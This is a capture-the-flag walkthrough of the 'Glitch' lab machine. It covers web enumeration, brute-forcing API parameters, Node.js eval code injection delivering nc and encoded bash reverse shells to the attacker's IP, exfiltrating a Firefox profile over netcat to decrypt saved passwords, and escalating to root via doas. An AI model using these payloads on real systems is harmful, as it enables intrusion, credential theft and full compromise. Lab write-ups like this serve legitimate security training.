# GLITCH

## Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?
```
Machine's IP: 10.10.192.225
```

**NMAP**

Firstly, once the machine is up we can begin with an active enumeration using nmap
```bash
# Nmap 7.95 scan initiated Fri Oct 17 10:07:00 2025 as: /usr/lib/nmap/nmap --privileged -A -oN nmap.txt -T4 -Pn -p- 10.10.192.225
Nmap scan report for 10.10.192.225
Host is up (0.051s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 10.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   50.08 ms 10.9.0.1
2   51.15 ms 10.10.192.225

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 17 10:18:07 2025 -- 1 IP address (1 host up) scanned in 667.43 seconds
```

We can notice that there's a single service, an nginx server running a website on version 1.14.0 unexploitable if we check using searchsploit.

**GOBUSTER**

As there's a website we will start by doing a directory fuzzing with gobuster with the following
```bash
gobuster dir -u http://10.10.192.225/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t40 -x php
```
We notice that gobuster has found 3 folders but one more interesting than the others : **/secret**

Accessing to /secret tells us that the access is forbidden and if we check our cookies we can notice we have one empty cookie

Now let's have a look at the mainpage source code, we notice that an api is called to **/api/access** but it somewhat fails so we can try calling the api by ourself

Calling the api with a GET requests such as our browser gives us a base64 string (decoding it will give us the first THM flag)

Let's inject this decoded string as our cookie and bingo we can access to /secret and the most important thing: **the mainpage is a different one**!

Inspecting the mainpage can tell us another endpoint of the api is called : **/api/items** or we can also fuzz the api with something like
```bash
gobuster dir -u http://10.10.192.225/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t40
```

Using the GET method to the api gives nothing interesting so i'm wondering what happen if we use the POST one with something like
```bash
curl -X POST http://10.10.192.225/api/items
```
By doing that the api answer us with a weird message "bug in the matrix" so maybe the api needs an argument? We can bruteforce args with ffuf for example:
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://glitch.thm/api/items?FUZZ=test -X POST
```
BINGO we have an arg called **cmd**

Let's try an random POST request at /api/items?cmd=
```bash
curl -X POST http://glitch.thm/api/items?cmd=tututututu
```
With something invalid we have a nodejs error telling us the api IS a nodejs one so we can maybe try a [nodejs eval rce](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44)
```bash
curl -X POST http://glitch.thm/api/items?cmd=require("child_process").exec('nc MY_IP 9005 -e /bin/sh')
```
```bash
girsh listen -p 9005
```
Here using girsh to get an interactive unbreakable shell we have no answer so we can try another reverse shell like a bash one url encoding it such as
```bash
POST /api/items?cmd=require("child_process").exec('%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%35%4c%6a%51%75%4d%54%63%32%4c%7a%6b%77%4d%44%55%67%4d%44%34%6d%4d%51%6f%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68')
```
reverse shell!!!

**PRIVESC**

We can firstly start by listing our sudo rights without any success but we can also list every bins that has the SUID perm set with
```bash
find / -type f -perm -04000 -ls 2>/dev/null
/usr/local/bin/doas
```
We here have the doas command so we can get its configuration file
```bash
cat /usr/local/etc/doas.conf
```
By reading at the file we notice that a rule is set that specify if we are **v0id** we can execute command with doas as **root** so we need to be v0id to be root (we are currently user)

Let's have a look to what's inside our directory because why not?

At first it seems empty but there is an hidden folder called **.firefox**, this file correspond to a firefox profile maybe containing passwords saved

We can try using firefox_decrypt to extract passwords so let's upload the folder to our machine
```bash
# our machine
nc -lnvp 9010 | tar -xf - .
```
```bash
# reverse shell
tar -cf . - | nc MY_IP 9010
```
Let's wait a bit and now we all the files and the folder

Now let's extract the passwords with [firefox_decrypt](https://github.com/unode/firefox_decrypt)
```bash
python firefox_decrypt.py /home/kali/workspace/labs/thm/easy/Glitch/firefox
Select the Mozilla profile you wish to decrypt
1 -> hknqkrn7.default
2 -> b5w4643p.default-release
$ 2

Website:   https://glitch.thm
Username: 'v0id'
Password: '[redacted]'
```        
Now we have the password of v0id we can log as v0id with
```bash
su - v0id
```

Let's lastly get a shell as root using doas
```bash
v0id@ubuntu:~$ doas -u root bash -p
Password: [redacted]
root@ubuntu:/home/v0id# 
```
